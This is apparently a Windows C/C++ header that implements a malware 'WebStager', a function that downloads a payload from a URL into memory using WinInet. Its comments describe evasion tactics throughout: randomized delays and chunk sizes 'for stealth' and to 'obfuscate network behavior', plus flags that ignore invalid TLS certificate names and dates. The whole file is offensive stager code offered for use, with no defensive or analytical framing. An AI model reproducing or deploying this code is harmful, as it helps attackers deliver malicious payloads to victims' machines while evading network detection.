#pragma once
#include <WinInet.h>
#include <ctime>

#pragma comment (lib, "Wininet.lib")

// WebStager function
BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
    BOOL bSTATE = TRUE;                  // Function execution state
    HINTERNET hInternet = NULL, hInternetFile = NULL;  // Internet connection handles
    DWORD dwBytesRead = 0;               // Bytes read in current chunk
    SIZE_T sSize = 0, chunkSize = 0;     // Total payload size and current chunk size
    PBYTE pBytes = NULL, pTmpBytes = NULL;  // Payload and temporary buffers
    HANDLE hHeap = GetProcessHeap();     // Process heap for memory allocation
    HANDLE hRandomDelay = NULL;          // Handle for randomizing delays

    // Initialize random seed for stealth
    srand((unsigned int)time(NULL));

    // Create event for randomizing network behavior
    hRandomDelay = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (hRandomDelay == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    // Initial random delay to avoid predictable connection patterns
    WaitForSingleObject(hRandomDelay, rand() % 500);

    // Open internet session with specified user agent
    hInternet = InternetOpenW(szUserAgent, NULL, NULL, NULL, 0);
    if (hInternet == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    // Random delay to simulate natural network latency
    WaitForSingleObject(hRandomDelay, rand() % 400);

    // Open URL with stealth-focused connection flags
    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0,
        INTERNET_FLAG_SECURE |                // Use SSL
        INTERNET_FLAG_EXISTING_CONNECT |     // Reuse existing connection
        INTERNET_FLAG_IGNORE_CERT_CN_INVALID | // Ignore certificate name mismatches
        INTERNET_FLAG_NO_CACHE_WRITE |       // Prevent local caching
        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | // Ignore certificate expiration
        INTERNET_FLAG_HYPERLINK,             // Natural browser-like reloading
        0
    );
    if (hInternetFile == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    // Random delay before buffer allocation
    WaitForSingleObject(hRandomDelay, rand() % 300);

    // Allocate temporary buffer for chunk reading
    pTmpBytes = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    // Short delay to further obfuscate network behavior
    WaitForSingleObject(hRandomDelay, rand() % 100);

    // Read payload in variable-sized chunks
    while (TRUE) {
        // Generate chunk size and check if it's <= 1024
        do {
            chunkSize = 512 + (rand() % 1024);
        } while (chunkSize > 1024);

        // Read file chunk
        if (!InternetReadFile(hInternetFile, pTmpBytes, chunkSize, &dwBytesRead)) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        // Random inter-chunk delay
        WaitForSingleObject(hRandomDelay, rand() % 100);

        // Update total payload size
        sSize += dwBytesRead;

        // Dynamically allocate or resize payload buffer
        if (pBytes == NULL)
            pBytes = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBytesRead);
        else
            pBytes = (PBYTE)HeapReAlloc(hHeap, HEAP_ZERO_MEMORY, pBytes, sSize);

        if (pBytes == NULL) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        // Append current chunk to payload
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        SecureZeroMemory(pTmpBytes, dwBytesRead);

        // Stop reading if last chunk was smaller than expected
        if (dwBytesRead < chunkSize)
            break;
    }

    // Final random delay before returning payload
    WaitForSingleObject(hRandomDelay, rand() % 200);

    // Return payload details to caller
    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    // Close and reset internet session handle
    if (hInternet) {
        InternetCloseHandle(hInternet);
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    }

    // Close and reset URL connection handle
    if (hInternetFile) {
        InternetCloseHandle(hInternetFile);
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    }

    // Free temporary buffer memory
    if (pTmpBytes)
        HeapFree(hHeap, 0, pTmpBytes);

    return bSTATE;
}
